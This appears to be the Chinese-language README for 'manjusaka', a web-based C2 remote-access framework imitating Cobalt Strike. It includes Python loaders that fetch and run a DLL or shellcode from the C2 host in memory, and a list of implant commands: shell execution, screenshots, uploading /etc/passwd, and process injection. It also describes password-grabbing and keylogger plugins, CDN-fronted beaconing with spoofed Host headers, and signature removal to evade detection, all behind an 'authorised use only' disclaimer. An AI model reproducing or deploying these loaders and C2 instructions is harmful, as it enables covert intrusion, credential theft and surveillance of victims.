
# 免责声明 
本工具仅面向合法授权的企业安全建设行为，如您需要测试本工具的可用性，请自行搭建靶机环境。

在使用本工具进行检测时，您应确保该行为符合当地的法律法规，并且已经取得了足够的授权。请勿对非授权目标进行扫描。

此工具仅限于安全研究和教学，用户承担因使用此工具而导致的所有法律和相关责任！ 作者不承担任何法律和相关责任！

如您在使用本工具的过程中存在任何非法行为，您需自行承担相应后果，我们将不承担任何法律及连带责任。



# manjusaka
牛屎花  一款基于WEB界面的仿CobaltStrike C2远控 

##系统架构： ![](https://github.com/YDHCUI/manjusaka/blob/main/images/0.jpg)

## 使用方法
配置conf.toml 运行主文件
```bash
[root@devops nps]# ./manjusaka
[NPS] 2022/09/14 15:57:21 初始用户: manjusaka  密码: ZbFCa2L2LRd5
[NPS] 2022/09/14 15:57:21 创建项目: 公共项目 没有归属的npc放在这个项目里面
[NPS] 2022/09/14 15:57:21 监听项目路由: VHOS5vqN
[NPS] 2022/09/14 15:57:21 NPS监听地址 :3200
[NPS] 2022/09/14 15:57:21 NPU后台地址 : manjusaka
[NPS] 2022/09/14 15:57:21 NPC监听地址 :801
[NPS] 2022/09/14 15:57:21 NPC交互路由 : /:target/favicon.ico
[NPS] 2022/09/14 15:57:21 NPC下载路由 : /:target/assert/:sys/bg.jpg
[NPS] 2022/09/14 15:57:21 NPC文件路由 : /images/:fid/logo.png
```
则NPS访问地址为  http://192.168.93.217:3200/manjusaka  
账号密码见初始日志，每个人生成的密码及默认路由都不一样 如需修改 请自行编辑nps.db文件


1、创建项目，默认有一个公共项目，通过项目【状态】开关可以控制项目是否启用状态。选择当前项目后 可在回传结果里面查看当前项目回传的信息。

新建项目 配置需要填写以下项：

项目名称: 随便写 如：hvv2022

项目名称: 随便写 如 hvv2022

回调地址: 外网IP和端口  http://12.34.56.78:8080

上线域名: cdn域名 如 http://imagecdn2.alicdn.com  如果没有上cdn则填写和回调地址一样

Host头  : cdn上线时所需要的host请求头 

代理地址: NPC上线时如果需要走代理，在这里配置。比如我测试用的clash，代理配置为http://192.168.93.1:7890

Host    : cdn上线时所需要的host请求头 如 update.baiduimage.com  默认为上线域名

其它都会默认生成，点击确定更新之后需要刷新列表重新启用项目状态。

![](https://github.com/YDHCUI/manjusaka/blob/main/images/1.png)


2、根据项目 生成npc 可以直接使用exe或elf格式的npc。也可以使用其它语言加载npc母体 比如使用python加载npc母体dll
 
```python
import requests
from ctypes import cdll
res = requests.get("http://192.168.93.217:801/bq1iFEP2/assert/dll/x64/bg.jpg")
with open("a.dll","wb") as f:
    f.write(res.content)
cdll.LoadLibrary("a.dll").main()

```

或者使用shellcode内存加载的形式
```python
import requests
import ctypes
shellcode = requests.get("http://192.168.93.217:801/bq1iFEP2/assert/bin/x64/bg.jpg").content
rwxpage = ctypes.windll.kernel32.VirtualAlloc(0, len(shellcode), 0x1000, 0x40)
ctypes.windll.kernel32.RtlMoveMemory(rwxpage, shellcode, len(shellcode))
handle = ctypes.windll.kernel32.CreateThread(0, 0, rwxpage, 0, 0, 0)
ctypes.windll.kernel32.WaitForSingleObject(handle, -1)

```


![](https://github.com/YDHCUI/manjusaka/blob/main/images/2.png)

3、npc上线，点选中该npc即可对其进行操作， 输入help可查看帮助。目前支持的操作命令如下：
```
help      打印帮助 
ps        查看进程 eg: ps
ss        查看网络连接 eg: ss
ls        枚举文件 eg: ls /
cd        切换目录 eg: cd / 
sh        执行系统命令  eg: sh ps -aux  , sh tasklist  
cat       读取文本 cat a.txt
screen    执行截屏 screen
wget      下载文件 eg: wget http://192.168.1.1/a.txt <a.txt>    文件名可选 默认当前  
put       上传文件 eg: put /etc/passwd                          将passwd文件上传到nps服务器  
start     执行插件可执行文件 eg: start name <args>               需要可执行文件在plugins目录下 会自动把插件传到目标机器上面
pl        执行插件 eg: pl plugname <plugargs>                   需要插件在plugins目录下 
inject    注入进程 eg: inject pid <shellcodeurl>                shellcodeurl可选 默认下载当前shellcode下载链接 


```


![](https://github.com/YDHCUI/manjusaka/blob/main/images/3.png)

![](https://github.com/YDHCUI/manjusaka/blob/main/images/4.png)

![](https://github.com/YDHCUI/manjusaka/blob/main/images/5.png)

![](https://github.com/YDHCUI/manjusaka/blob/main/images/6.png)

![](https://github.com/YDHCUI/manjusaka/blob/main/images/7.png)

![](https://github.com/YDHCUI/manjusaka/blob/main/images/8.png)


4、插件系统 分为第三方程序的调用和内置插件

插件可在conf中配置默认启动参数，示例中有一个getpass插件 默认参数为all
```
[plug.getpass]
args = "all"

```

第三方程序的调用 比如现在我想将doglite作为插件启动 

则需要将doglite命名为plug_doglite_nps.exe放入plugins文件夹并在conf中配置参数如下
```
[plug.doglite]
args = "-service xx.xx.xx.xx:xx -action socks5  -local :40004 -r"

``` 
在信息页点选该插件运行，或在命令行输入 start doglite 即可启动该插件。

内置插件，生成dll/so插件, 以plug_name_nps.dll格式命名放到plugins文件夹下面 在命令行输入 pl getpass 即可动态调用

插件开发示例, plugmain传入插件运行参数 传出返回的内容值 
```rust
//./Cargo.toml

[lib]
path = "src/lib.rs"
crate-type = ["cdylib"]


//src/lib.rs

use std::ffi::CStr;
use std::ffi::CString;
use std::os::raw::c_char;

use protobuf::Message;
use protobuf::RepeatedField;

#[no_mangle]
pub unsafe extern "C" fn plugmain(args: *const c_char) -> *const c_char { 
    let args = CStr::from_ptr(args).to_str().unwrap();

    let mut prs = Vec::<plug::PassResult>::new();
    prs.push(plug::PassResult::new());
    
    let mut gret = plug::PlugResult{
        name: "test".to_string(),
        args: args.to_string(),
        resulttype: plug::ResultType::PASSRET,
        ..Default::default()
    };
    gret.set_passresult(RepeatedField::from_vec(prs));

    let c_str = gret.write_to_bytes().expect("protobuf to bytes err");


    CString::new(c_str).expect("CString failed").into_raw()
}


```
返回值匹配到如下protobuf格式后后将结果写入数据库

```protobuf

syntax = "proto3";


enum ResultType {
    PASSRET = 0;
    PORTRET = 1;
    HTTPRET = 2;
}

message PassResult {
    string username = 1;
    string password = 2;
    string passtype = 3;
    string passfrom = 4;
}

message PortResult {
    string host = 1;
    int32 port = 2;
    string proto = 3;
    string version = 4;
}

message HttpResult {
    string proto = 1;
    string host = 2;
    int32 port = 3;
    string title = 4;
    string note = 5;
}

message PlugResult {
    string name = 1;
    string args = 2;
    ResultType resulttype = 3;
    repeated PassResult passresult = 11;
    repeated PortResult portresult = 12;
    repeated HttpResult httpresult = 13;
}

```

5、 上线提醒功能 需要在conf里面配置一下webhook
demo里用的是wxpusher的方案，可以自己改 但是目前只支持POST模式。
body里面的模板支持以下变量
```
{Id}
{Target}
{Intranet}
{Username}
{Hostname}
{Platform}
{Process}
{Pid}
{Systype}
{Internet}
{Note}
{Projname}
{Projroute}
```


## 更新

### v0.8 
1、获取真实公网地址、并展示IP归属 , 密码加密，上线提醒功能 

2、支持cdn上线，加入代理上线功能 修复host头问题

3、默认获取所有历史npc上线列表

4、修复其它bug
 

### v0.7
1、新增shellcode加载方式，新增系统位数区分

2、去除nps db的agents表, 使用内存记录npc列表 将进程名称改为进程全路径

3、优化npu推送模式, 修复大量npc时的npu卡顿问题 

4、新增进程注入命令 简单实现 CopySelf

5、配置文件加密，配置分阶段加载。

6、去除了没啥用的功能


### v0.6
1、插件支持可执行文件

2、修复文件上传跨域bug

3、登录验证码，cookie时效机制

4、修复sh 执行命令不能加参数的bug 

5、优化npc体积 

6、更新kzta 系统密码读取插件，更新qvte键盘记录插件 


### v0.5
1、修复安全漏洞

2、开放NPC配置修改功能

3、上传文件流程优化

4、增加动态插件功能，可拓展更多功能 

5、去除特征、修复bug 


### v0.4
1、随机key 

2、去除特征、修复bug 

### v0.3
1、实现截屏、密码获取功能。(仅window) 

2、修复cmd界面不能黏贴的bug。 

3、修复项目不能暂停的bug。 

4、自动创建data文件夹。 


### v0.2
1、修改网络协议使流量加密。

2、加入本地文件上传下载功能。

3、修复shell界面位移bug。

### v0.1
1、实现基础远控功能。


## 交流
https://discord.gg/YMqeN5Qyk4

![1678687517388](https://user-images.githubusercontent.com/46884495/224620568-d4fd64ba-d005-48d8-b120-302c9811a2f7.png)
